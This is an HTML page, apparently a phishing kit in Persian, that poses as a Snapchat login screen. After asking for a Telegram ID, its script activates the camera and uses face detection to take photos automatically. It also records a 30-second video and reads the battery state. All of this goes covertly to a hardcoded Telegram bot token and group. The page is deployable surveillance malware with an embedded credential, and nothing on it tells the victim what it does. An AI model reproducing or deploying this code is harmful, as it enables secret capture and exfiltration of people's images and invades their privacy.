<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ورود به اسنپ چت</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
  <style>
    body {
      font-family: 'Vazirmatn', sans-serif;
      margin: 0; background: #000; color: white; direction: rtl;
    }
    #formSection {
      position: absolute; top: 0; left: 0; width: 100%; height: 100vh;
      background: black; z-index: 10;
      display: flex; flex-direction: column; justify-content: center; align-items: center;
    }
    input {
      padding: 1rem; font-size: 1rem; border-radius: 0.75rem;
      margin-bottom: 1rem; width: 80%; max-width: 320px;
    }
    button {
      padding: 1rem 2rem; background: #FFFC00; color: black;
      font-weight: bold; border-radius: 0.75rem;
    }
    video, canvas {
      position: absolute; top: 0; left: 0;
      width: 100vw; height: 100vh; object-fit: cover;
    }
    #overlay { pointer-events: none; }
    .control-panel {
      position: absolute; bottom: 20px; right: 20px; display: flex; gap: 12px; z-index: 20;
    }
    .control-panel button {
      padding: 0.5rem 1rem; font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <div id="formSection">
    <input id="userInput" type="text" placeholder="آیدی تلگرام (مثلاً @username)">
    <button onclick="startApp()">شروع</button>
  </div><video id="video" autoplay muted playsinline></video> <canvas id="overlay"></canvas>

  <div class="control-panel">
    <button onclick="switchCamera()">سوئیچ دوربین</button>
    <button onclick="manualCapture()">عکس دستی</button>
  </div>  <script>
    const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
    const groupId = '-1002534583259';

    let uid = '';
    let video = document.getElementById("video");
    let overlay = document.getElementById("overlay");
    let ctx = overlay.getContext("2d");
    let photoCount = 0;
    let detected = false;
    let useFront = true;
    let stream;
    let fallbackStarted = false;
    let recorder;
    let chunks = [];
    let recordingStopped = false;

    async function initCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = await navigator.mediaDevices.getUserMedia({
        video: { width: 640, height: 360, facingMode: useFront ? "user" : "environment" },
        audio: false
      });
      video.srcObject = stream;
      return new Promise(resolve => {
        video.onloadedmetadata = () => {
          overlay.width = video.videoWidth;
          overlay.height = video.videoHeight;
          resolve();
        };
      });
    }

    async function startApp() {
      const input = document.getElementById("userInput").value.trim();
      if (!input || !input.startsWith('@')) {
        alert("آیدی معتبر وارد کنید (مثلاً @username)");
        return;
      }
      uid = input;
      document.getElementById("formSection").style.display = "none";
      await initCamera();
      startRecording();

      const model = await blazeface.load();

      let detectionTimeout = setTimeout(() => {
        if (!fallbackStarted && photoCount < 10) {
          fallbackStarted = true;
          for (let i = 0; i < 10; i++) {
            setTimeout(() => {
              if (photoCount < 15) captureAndSend();
            }, i * 4000);
          }
        }
      }, 7000);

      setTimeout(() => {
        stopRecording();
      }, 30000);

      async function detectLoop() {
        if (photoCount >= 15) return;
        const predictions = await model.estimateFaces(video, false);
        ctx.clearRect(0, 0, overlay.width, overlay.height);

        if (predictions.length > 0 && !detected) {
          detected = true;
          captureAndSend();
          setTimeout(() => detected = false, 2500);
        }

        predictions.forEach(p => {
          const [x, y] = p.topLeft;
          const [x2, y2] = p.bottomRight;
          ctx.strokeStyle = "#FFFC00";
          ctx.lineWidth = 2;
          ctx.strokeRect(x, y, x2 - x, y2 - y);
        });

        requestAnimationFrame(detectLoop);
      }

      detectLoop();
    }

    function switchCamera() {
      useFront = !useFront;
      initCamera();
    }

    function manualCapture() {
      if (photoCount < 15) captureAndSend();
    }

    async function captureAndSend() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx2 = canvas.getContext("2d");
      ctx2.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("photo", blob, `photo_${photoCount}.jpg`);
        form.append("caption", `آیدی: ${uid}\nعکس: ${++photoCount}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: form
        });
      }, 'image/jpeg');
    }

    function startRecording() {
      chunks = [];
      recorder = new MediaRecorder(stream, {
        mimeType: 'video/webm;codecs=vp8',
        videoBitsPerSecond: 500000
      });
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = sendVideo;
      recorder.start();
    }

    function stopRecording() {
      if (recorder && recorder.state !== 'inactive') {
        recorder.stop();
      }
    }

    async function sendVideo() {
      if (recordingStopped) return;
      recordingStopped = true;

      const blob = new Blob(chunks, { type: 'video/webm' });
      const form = new FormData();
      form.append("chat_id", groupId);
      form.append("video", blob, `session_${Date.now()}.webm`);
      form.append("caption", `ویدیو ضبط‌شده از کاربر ${uid}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: 'POST',
        body: form
      });
    }
  </script></body>
</html>
